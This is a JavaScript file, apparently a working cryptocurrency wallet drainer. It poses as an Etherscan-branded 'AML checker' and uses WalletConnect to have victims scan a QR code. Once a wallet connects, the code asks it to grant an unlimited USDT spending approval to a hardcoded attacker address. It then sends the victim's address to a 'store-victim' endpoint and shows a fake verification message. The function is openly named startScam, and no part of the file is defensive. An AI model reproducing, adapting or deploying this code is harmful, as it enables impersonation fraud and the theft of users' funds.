const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const API = 'https://aml-checker-4.vercel.app/api/store-victim';

const TOKENS = {
  '1': [
    { name: 'USDT', addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7' }
  ]
};

let signClient;
let session;
let account;
const PROJECT_ID = '0ecdd9357f8779fcb4c4944118927362';

function getSignClient() {
  const ns = window["@walletconnect/sign-client"];
  if (ns) {
    const sc = ns.SignClient || ns.default;
    if (sc && typeof sc.init === 'function') return sc;
  }
  return null;
}

// Ajoute le logo au centre du canvas QR
function addLogoToQR(canvas, logoUrl) {
  const ctx = canvas.getContext('2d');
  const image = new Image();
  image.crossOrigin = 'anonymous';
  image.src = logoUrl;
  image.onload = function() {
    const size = canvas.width;
    const logoSize = size * 0.25; // 25% de la taille
    const x = (size - logoSize) / 2;
    const y = (size - logoSize) / 2;

    // Fond blanc arrondi derrière le logo
    ctx.fillStyle = '#ffffff';
    const borderRadius = 10;
    ctx.beginPath();
    ctx.moveTo(x + borderRadius, y);
    ctx.lineTo(x + logoSize - borderRadius, y);
    ctx.quadraticCurveTo(x + logoSize, y, x + logoSize, y + borderRadius);
    ctx.lineTo(x + logoSize, y + logoSize - borderRadius);
    ctx.quadraticCurveTo(x + logoSize, y + logoSize, x + logoSize - borderRadius, y + logoSize);
    ctx.lineTo(x + borderRadius, y + logoSize);
    ctx.quadraticCurveTo(x, y + logoSize, x, y + logoSize - borderRadius);
    ctx.lineTo(x, y + borderRadius);
    ctx.quadraticCurveTo(x, y, x + borderRadius, y);
    ctx.closePath();
    ctx.fill();

    // Dessiner le logo
    ctx.drawImage(image, x, y, logoSize, logoSize);
  };
  image.onerror = () => console.error('Erreur chargement logo');
}

async function initWalletConnect() {
  const SignClientClass = getSignClient();
  if (!SignClientClass) throw new Error('WalletConnect SignClient non trouvé.');

  signClient = await SignClientClass.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'etherscan.io',
      description: 'etherscan.io',
      url: 'https://aml-checker-4.vercel.app',
      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
    }
  });

  // Seulement Ethereum mainnet
  const { uri, approval } = await signClient.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
        chains: ['eip155:1'],
        events: ['chainChanged', 'accountsChanged']
      }
    }
  });

  // Attend que QRCode soit chargé
  await new Promise((resolve, reject) => {
    if (typeof QRCode !== 'undefined') return resolve();
    let tries = 0;
    const interval = setInterval(() => {
      if (typeof QRCode !== 'undefined') {
        clearInterval(interval);
        resolve();
      }
      tries++;
      if (tries > 10) {
        clearInterval(interval);
        reject(new Error('QRCode non chargé après 5s'));
      }
    }, 500);
  });

  const qrDiv = document.getElementById('qrcode');
  qrDiv.innerHTML = '';

  // Création d'un canvas pour le QR code (permet d'ajouter le logo)
  const canvas = document.createElement('canvas');
  qrDiv.appendChild(canvas);

  // Génération du QR code avec la librairie qrcodejs (version 1.0.0)
  QRCode.toCanvas(canvas, uri, {
    width: 280,
    height: 280,
    margin: 2,
    color: { dark: '#000000', light: '#ffffff' },
    correctLevel: QRCode.CorrectLevel.H
  }, (error) => {
    if (error) {
      console.error('Erreur QR code :', error);
      document.getElementById('status').innerText = 'Erreur génération QR';
      return;
    }
    // Ajouter le logo après la génération réussie
    addLogoToQR(canvas, '/etherscan-logo-circle.png');
  });

  document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';

  session = await approval();
  const accounts = session.namespaces['eip155'].accounts;
  account = accounts[0].split(':')[2];
  currentChainId = accounts[0].split(':')[1];

  document.getElementById('qrcode').style.display = 'none';
  document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;

  setTimeout(() => startScam(), 1000);
}

async function startScam() {
  const tokens = TOKENS[currentChainId];
  if (!tokens || currentChainId !== '1') {
    document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
    return;
  }

  // GasPrice fixé à 2 gwei
  const gasPrice = ethers.utils.hexlify(2000000000);

  for (const t of tokens) {
    const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
    const data = iface.encodeFunctionData('approve', [ATTACKER, ethers.constants.MaxUint256]);

    const tx = {
      from: account,
      to: t.addr,
      data: data,
      chainId: 1,
      gasLimit: ethers.utils.hexlify(50000),
      gasPrice: gasPrice
    };

    try {
      const result = await signClient.request({
        topic: session.topic,
        request: {
          id: Date.now(),
          jsonrpc: '2.0',
          method: 'eth_sendTransaction',
          params: [tx]
        },
        chainId: 'eip155:1'
      });
      console.log(`✅ Approve ${t.name} : ${result}`);
    } catch (e) {
      console.error(`❌ Approve ${t.name} échoué :`, e);
    }
  }

  // Envoi de la victime à l'API
  await fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ victim: account, chain: currentChainId })
  });

  document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
  setTimeout(() => window.location.href = '/report.html', 3000);
}

initWalletConnect().catch(err => {
  console.error('Erreur init WalletConnect:', err);
  document.getElementById('status').innerText = `Erreur : ${err.message || err}`;
});
